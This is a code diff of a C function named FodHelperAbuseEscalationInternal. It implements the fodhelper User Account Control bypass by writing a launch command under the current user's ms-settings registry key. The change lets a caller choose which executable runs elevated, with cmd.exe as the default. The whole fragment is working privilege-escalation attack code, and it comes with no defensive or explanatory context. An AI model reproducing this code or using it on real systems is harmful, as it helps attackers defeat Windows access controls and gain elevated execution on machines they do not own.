@@ -9,11 +9,14 @@
 
 #pragma comment(lib, "Advapi32.lib")
 
-int FodHelperAbuseEscalationInternal() {
+int FodHelperAbuseEscalationInternal(const char* execPath) {
     HKEY hkey;
     DWORD d;
     const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
-    const char* cmd = "cmd /c start C:\\Windows\\System32\\cmd.exe";
+    const char* defaultExec = "C:\\Windows\\System32\\cmd.exe";
+    const char* target = (execPath != NULL && execPath[0] != '\0') ? execPath : defaultExec;
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "cmd /c start %s", target);
     const char* del = "";
 
     LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
